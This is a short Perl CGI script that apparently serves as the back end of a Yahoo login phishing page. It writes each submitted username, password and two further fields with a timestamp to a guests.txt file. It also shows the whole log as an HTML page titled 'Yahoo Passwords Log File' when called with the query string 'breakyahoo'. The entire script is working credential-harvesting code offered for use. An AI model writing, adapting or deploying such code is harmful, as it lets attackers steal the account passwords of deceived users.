#!d:/perl/bin/perl.exe
#use strict;
use warnings;
use CGI::Carp qw(fatalsToBrowser); 
require 'func.pl';
require 'cgi-lib.pl';
my $rooturl="$ENV{DOCUMENT_ROOT}";
my $guestfile='guests.txt';

print "content-type:text/html\n\n";
	
	if($ENV{'QUERY_STRING'} eq "breakyahoo")
	{
	
		print <<EOF1;
	
		<html>
		<head>
		<title>Yahoo Passwords</title>
		</head>
EOF1
		
		open LOGFILE,"$rooturl/yahoo/$guestfile" or &error("\ncannot open file");
		print "<h1>Yahoo Passwords Log File</h1>";
		while(<LOGFILE>)
		{
			print $_;
			print "<br>\n";
		}
		
		close LOGFILE;
		
		print <<EOF1;
		</body>
		</html>
EOF1
	}
	else
	{


		if(-e "$rooturl/yahoo/$logfile")
		{
		open LOGFILE,">>$rooturl/yahoo/$guestfile";
		}
		else
		{
		open LOGFILE,">$rooturl/yahoo/$guestfile"  or &error("\ncannot open file");
		}
		
		
		&ReadParse(*in);
		
		print LOGFILE $in{'login'};
		print LOGFILE "|";
		print LOGFILE $in{'passwd'};
		print LOGFILE "|";
		print LOGFILE $in{'S1'};
		print LOGFILE "|";
		print LOGFILE $in{'S2'};
		print LOGFILE "|";
		my $time=&get_time;   
		print LOGFILE "$time\n";
		close LOGFILE ;
		
		
	}
	